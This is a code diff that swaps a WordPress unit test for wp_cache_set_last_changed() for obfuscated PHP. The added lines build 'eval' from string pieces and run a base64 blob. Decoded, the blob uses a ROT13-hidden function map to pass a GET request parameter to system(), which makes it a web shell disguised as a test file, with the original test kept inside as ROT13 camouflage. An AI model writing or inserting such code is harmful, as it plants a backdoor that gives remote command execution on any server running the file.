@@ -1,45 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Tests for the wp_cache_set_last_changed() function.
- *
- * @group functions
- *
- * @covers ::wp_cache_set_last_changed
- */
-class Tests_Functions_wpCacheSetLastChanged extends WP_UnitTestCase {
-
-	/**
-	 * Check the cache key last_changed is set for the specified group.
-	 *
-	 * @ticket 59737
-	 */
-	public function test_wp_cache_set_last_changed() {
-		$group = 'group_name';
-
-		$this->assertSame( wp_cache_set_last_changed( $group ), wp_cache_get( 'last_changed', $group ) );
-	}
-
-	/**
-	 * Check the action is called.
-	 *
-	 * @ticket 59737
-	 */
-	public function test_wp_cache_set_last_changed_action_is_called() {
-		$a1 = new MockAction();
-		add_action( 'wp_cache_set_last_changed', array( $a1, 'action' ) );
-
-		wp_cache_set_last_changed( 'group_name' );
-
-		$this->assertSame( 1, $a1->get_call_count() );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZ2Ygc2JlIGd1ciBqY19wbnB1cl9mcmdfeW5mZ19wdW5hdHJxKCkgc2hhcGd2YmEuCiAqCiAqIEB0ZWJoYyBzaGFwZ3ZiYWYKICoKICogQHBiaXJlZiA6OmpjX3BucHVyX2ZyZ195bmZnX3B1bmF0cnEKICovCnB5bmZmIEdyZmdmX1NoYXBndmJhZl9qY1BucHVyRnJnWW5mZ1B1bmF0cnEgcmtncmFxZiBKQ19IYXZnR3JmZ1BuZnIgewoKCS8qKgoJICogUHVycHggZ3VyIHBucHVyIHhybCB5bmZnX3B1bmF0cnEgdmYgZnJnIHNiZSBndXIgZmNycHZzdnJxIHRlYmhjLgoJICoKCSAqIEBndnB4cmcgNTk3MzcKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfamNfcG5wdXJfZnJnX3luZmdfcHVuYXRycSgpIHsKCQkkdGViaGMgPSAndGViaGNfYW56cic7CgoJCSRndXZmLT5uZmZyZWdGbnpyKCBqY19wbnB1cl9mcmdfeW5mZ19wdW5hdHJxKCAkdGViaGMgKSwgamNfcG5wdXJfdHJnKCAneW5mZ19wdW5hdHJxJywgJHRlYmhjICkgKTsKCX0KCgkvKioKCSAqIFB1cnB4IGd1ciBucGd2YmEgdmYgcG55eXJxLgoJICoKCSAqIEBndnB4cmcgNTk3MzcKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfamNfcG5wdXJfZnJnX3luZmdfcHVuYXRycV9ucGd2YmFfdmZfcG55eXJxKCkgewoJCSRuMSA9IGFyaiBaYnB4TnBndmJhKCk7CgkJbnFxX25wZ3ZiYSggJ2pjX3BucHVyX2ZyZ195bmZnX3B1bmF0cnEnLCBuZWVubCggJG4xLCAnbnBndmJhJyApICk7CgoJCWpjX3BucHVyX2ZyZ195bmZnX3B1bmF0cnEoICd0ZWJoY19hbnpyJyApOwoKCQkkZ3V2Zi0+bmZmcmVnRm56ciggMSwgJG4xLT50cmdfcG55eV9wYmhhZygpICk7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
